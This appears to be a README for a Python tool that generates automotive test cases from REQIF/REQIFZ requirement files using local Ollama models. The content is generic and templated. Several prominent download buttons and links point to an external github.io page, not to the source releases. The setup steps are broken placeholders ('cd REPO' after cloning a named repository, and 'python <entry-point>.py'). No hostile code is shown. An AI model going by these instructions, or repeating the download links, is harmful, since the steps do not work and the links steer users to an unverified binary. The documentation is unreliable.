# AI Test Case Generator v2.3.0 - Automotive Requirements Test Generation 2026

> **AI Test Case Generator v2.3.0 is a Python utility for converting automotive requirements stored in REQIF and REQIFZ files into structured test cases. It supports local models, asynchronous execution, and several output formats.**

[![Platform](https://img.shields.io/badge/Platform-Python-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2.3.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/jason-brooksmrz9755/automotive-ai-test-generator?style=flat-square)](https://github.com/jason-brooksmrz9755/automotive-ai-test-generator)

---

<p align="center">
  <a href="https://jason-brooksmrz9755.github.io/automotive-ai-test-generator/">
    <img src="https://img.shields.io/badge/Download-AI%20Test%20Case%20Generator%20Latest-brightgreen?style=for-the-badge" alt="Download AI Test Case Generator">
  </a>
</p>

> **[Download AI Test Case Generator v2.3.0](https://jason-brooksmrz9755.github.io/automotive-ai-test-generator/)**

---

[Download Latest Build](https://jason-brooksmrz9755.github.io/automotive-ai-test-generator/)

---

## Overview

AI Test Case Generator gives automotive engineering teams a way to transform structured requirements into test case artifacts ready for review and continued engineering work. REQIF and REQIFZ inputs are read and interpreted with locally hosted models, after which the resulting test cases are organized for export and follow-up processing.

The application accommodates different model strategies and repeatable generation workflows. Teams can work with text-only, vision, or hybrid models, and images stored inside REQIFZ archives can be extracted when visual requirement content is part of the process. Generated data can be written to Excel or JSON.

---

## Capabilities

- Build organized test cases from REQIF and REQIFZ requirement files.
- Use Ollama to access language models running locally.
- Select text-based, vision-based, or hybrid model processing.
- Retrieve embedded images from REQIFZ archives.
- Run requirement processing asynchronously.
- Save generated test cases as Excel workbooks.
- Produce structured JSON output.
- Optionally explore the RAFT training workflow.

---

## Installation

### Get the source

```bash
git clone https://github.com/jason-brooksmrz9755/automotive-ai-test-generator.git
cd REPO
```

### Create and activate a virtual environment

```bash
python -m venv .venv
```

Activate the environment:

**Linux or macOS**

```bash
source .venv/bin/activate
```

**Windows PowerShell**

```powershell
.venv\Scripts\Activate.ps1
```

Install the project dependencies:

```bash
pip install -r requirements.txt
```

When using Ollama for local inference, install Ollama independently and ensure the required local model has been downloaded and is available before launching a generation job.

---

## Running the Generator

The usual process follows these steps:

1. Obtain an automotive requirements document in REQIF or REQIFZ format.
2. Launch the local model service required by the project.
3. Choose a text, vision, or hybrid processing mode.
4. Pass the requirements file to the application.
5. Wait for asynchronous processing to finish.
6. Inspect the generated test cases.
7. Export the results in Excel or JSON format.
8. Optionally run the RAFT workflow for training-related experimentation.

Example project setup:

```bash
python --version
pip install -r requirements.txt
```

The precise launch command depends on the entry point included in the checked-out release. View the available options with:

```bash
python <entry-point>.py --help
```

---

## Configuration

Use the configuration files or runtime arguments supported by the project to define model and processing behavior. Settings commonly cover the local provider, model category, source file, output type, and asynchronous execution preferences.

```yaml
model_provider: ollama
model_type: hybrid
input_file: ./requirements/example.reqifz
output_format: xlsx
async_processing: true
```

Apply these values according to the configuration format shipped with the release. Vision processing requires a model capable of accepting image input, while REQIFZ workflows may extract images embedded in the archive.

---

## System Requirements

- A Python runtime supported by this release.
- An environment where Python applications and their dependencies can be installed.
- Automotive requirement documents in REQIF or REQIFZ format.
- Ollama for local model integration.
- A compatible local text, vision, or hybrid model.
- Sufficient storage for extracted REQIFZ images and generated Excel or JSON output.
- Optional resources needed by the RAFT training workflow.

---

## Frequently Asked Questions

### Which input files can I use?

Automotive requirements may be supplied as REQIF or REQIFZ files.

### What kinds of models are supported?

The available workflows cover text models, vision models, and hybrid local model configurations. Ollama is used for the local model connection described by the project profile.

### Are images inside REQIFZ archives supported?

Yes. Images embedded in REQIFZ packages can be extracted for workflows that process visual requirement information.

### Where can the generated data be exported?

The generated test cases and related structured results can be exported to Excel or JSON.

### Is asynchronous execution available?

Yes. The generator supports asynchronous processing for requirement-to-test-case workflows rather than requiring all work to occur as one sequential operation.

### How can I select another model?

Change the provider and model settings through the project's supported configuration files or runtime options. The chosen local model must also be available through Ollama.

### What should I investigate when generation does not work?

Check that the source is a valid REQIF or REQIFZ file, all dependencies have been installed, the local model service is running, and the selected model supports the chosen text or vision workflow.

### How do I receive the latest version?

Download the current build using the repository's latest release or the download link above. Before replacing an existing installation, review the release notes and any configuration changes.

---

## Planned Work

- Further improve automotive requirements-to-test-case generation.
- Refine model selection for text, vision, and hybrid workflows.
- Extend asynchronous processing functionality.
- Continue development of the optional RAFT training workflow.
- Strengthen output export and generated-result review workflows.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
